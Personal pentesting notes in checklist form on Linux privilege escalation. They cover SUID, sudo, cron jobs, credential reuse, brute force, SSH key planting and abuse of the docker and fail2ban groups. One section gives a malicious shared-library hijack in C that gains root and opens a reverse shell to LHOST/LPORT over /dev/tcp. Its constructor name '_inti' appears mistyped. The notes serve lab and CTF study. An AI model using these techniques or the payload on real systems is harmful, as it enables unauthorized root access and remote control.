# Linux Privilege Escallation

- [ ] Writable `/etc/shadow`
- [ ] Writable `/etc/passwd`
- [ ] Check user's history
- [ ] Check user's `env`
- [ ] Check user's `.bashrc`
- [ ] SUID Bit
- [ ] `sudo -l`
- [ ] Cron Job
  - [ ] There may be missing library for binary file we can write create and write it [HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)
- [ ] Get the usernames from `/home` start brute force for the users
- [ ] If you come from web check `config.php`
- [ ] Look for services like `mysql`
- [ ] Look for internal ports
- [ ] Password Reuse (get password from different resources like db, config files and reuse them)
- [ ] Username and the password the same like `patrick:patrick`
- [ ] Create a key pair using `ssh-keygen` command and then change `id_rsa.pub` file to `authorized_keys` and add this file
- [ ] Check group of the user:
  - [ ] if it is `fail2ban` group [fail2ban PrivEsc](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7) (PG-Practice Fail)
  - [ ] if it is `filter` group [filter PrivEsc](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)
    - [ ] `find / -group filter 2>/dev/null`
  - [ ] if it is `docker` group [docker PrivSec](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/peppo)
- [ ] Service **`find /etc -type f -writable 2> /dev/null`** https://al1z4deh.medium.com/proving-grounds-hetemit-8469d0a3f189


## Restricted Bash (RBASH)
- [ ] Check available commands `echo $PATH`
- [ ] 

## Interesting Group
```
find / -group filter 2>/dev/null
```

## Binary Missing Component
1. You find a binary file that may be run by root user (SUID or SUDO or CronJob)
2. Try to run it
3. If it gives missing like "cannot open shared object file"
4. Check path `LD_LIBRARY_PATH` in `/etc/crontab` for example.
5. Find writable directory
```
find / -type d -writable 2>/dev/null
```
6. Match writable directories with PATH
7. Write a malicious .c file
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _inti() {
  setgid(0);
  setuid(0);
  system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1");
}
```
8. Compile it
```
gcc -shared -fPIC -nostartfiles exploit.c -o exploit.so
```
9. Put it to the target place
10. Run the binary

## Tar
https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c

